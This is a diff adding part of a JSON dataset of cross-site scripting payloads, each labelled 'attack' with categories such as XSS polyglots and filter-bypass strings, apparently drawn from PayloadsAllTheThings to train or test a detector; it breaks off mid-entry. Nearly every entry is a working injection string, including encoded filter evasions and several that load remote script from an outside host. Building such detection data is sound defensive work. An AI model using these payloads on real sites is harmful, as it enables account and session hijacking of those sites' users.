+    "text": "<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script a=\\u0061 & /=%2F",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script ????????????",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>+-+-1-+-+alert(1)</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body/onload=&lt;!--&gt;&#10alert(1)>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script itworksinallbrowsers>/*<script* */alert(1)</script ?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src ?itworksonchrome?\\/onerror = alert(1)???",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><script>//&NewLine;confirm(1);</script </svg>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><script onlypossibleinopera:-)> alert(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script x> alert(1) </script 1=2",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<div/onmouseover='alert(1)'> style=\"x:\">",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<--`<img/src=` onerror=alert(1)> --!>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<div  style=\"position:absolute;top:0;left:0;width:100%;height:100%\"  onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><img src=x onerror=window.open('https://www.google.com/');>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><button formaction=javascript&colon;alert(1)>CLICKME",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe  src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a  href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click  Me</a>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><img src=x onerror=prompt(1);>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http://i.imgur.com/P8mL8.jpg\">",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()//",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "--></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "/</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript://--></title></style></textarea></script><svg \"//' onclick=alert()//",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "/</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+    "label": "attack",
+    "category": "pat-XSS_Polyglots",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg onload=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><svg onload=alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"onmouseover=alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"autofocus/onfocus=alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'-alert(1)-'",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'-alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\\'-alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "</script><svg onload=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onblur=alert(1)>lose focus!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onclick=alert(1)>click this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x oncopy=alert(1)>copy this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x oncontextmenu=alert(1)>right click this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x oncut=alert(1)>copy this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x ondblclick=alert(1)>double click this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x ondrag=alert(1)>drag this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onfocus=alert(1)>focus this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable oninput=alert(1)>input here!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onkeydown=alert(1)>press any key!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onkeypress=alert(1)>press any key!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onkeyup=alert(1)>press any key!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onmousedown=alert(1)>click this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onmousemove=alert(1)>hover this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onmouseout=alert(1)>hover this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onmouseover=alert(1)>hover this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onmouseup=alert(1)>click this!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x contenteditable onpaste=alert(1)>paste here!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(1)<!–",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=//brutelogic.com.br/1.js>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=//3334957647/1>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%3Cx onxxx=alert(1)",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<%78 onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x %6Fnxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x o%6Exxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x on%78xx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onxxx%3D1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<X onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x OnXxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<X OnXxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onxxx=1 onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x/onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x%09onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x%0Aonxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x%0Conxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x%0Donxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x%2Fonxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x 1='1'onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x 1=\"1\"onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x </onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x 1=\">\" onxxx=1",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<http://onxxx%3D1/",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x onxxx=alert(1) 1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'onload=alert(1)><svg/1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'>alert(1)</script><script/1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "*/alert(1)</script><script>/*",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "*/alert(1)\">'onload=\"/*<svg/1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "`-alert(1)\">'onload=\"`<svg/1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "*/</script>'>alert(1)/*<script/1='",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=javascript:alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=javascript:alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<embed src=javascript:alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=javascript:alert(1)>click",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<math><brute href=javascript:alert(1)>click",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form action=javascript:alert(1)><input type=submit>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<isindex action=javascript:alert(1) type=submit value=click>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><button formaction=javascript:alert(1)>click",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><input formaction=javascript:alert(1) type=submit value=click>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><input formaction=javascript:alert(1) type=image value=click>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><input formaction=javascript:alert(1) type=image src=SOURCE>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<isindex formaction=javascript:alert(1) type=submit value=click>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object data=javascript:alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><script xlink:href=data:,alert(1) />",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<math><brute xlink:href=javascript:alert(1)>click",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<html ontouchstart=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<html ontouchend=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<html ontouchmove=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<html ontouchcancel=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onorientationchange=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><img src=1 onerror=alert(1)>.gif",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=\"data:&comma;alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><script src=data:&comma;alert(1)//",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=\"//brutelogic.com.br&sol;1.js&num;",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><script src=//brutelogic.com.br&sol;1.js&num;",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<link rel=import href=\"data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<base href=//0>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onload=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onpageshow=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onfocus=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onhashchange=alert(1)><a href=#x>click this!#x",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onscroll=alert(1)><br><br><br><br>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onresize=alert(1)>press F12!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onhelp=alert(1)>press F1! (MSIE)",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<marquee onstart=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<marquee loop=1 width=0 onfinish=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<audio src onloadstart=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video onloadstart=alert(1)><source>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<input autofocus onblur=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<keygen autofocus onfocus=alert(1)>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form onsubmit=alert(1)><input type=submit>",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<select onchange=alert(1)><option>1<option>2",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<menu id=x contextmenu=x onshow=alert(1)>right click me!",
+    "label": "attack",
+    "category": "pat-BRUTELOGIC-XSS-STRINGS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "javascript:alert(1)//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
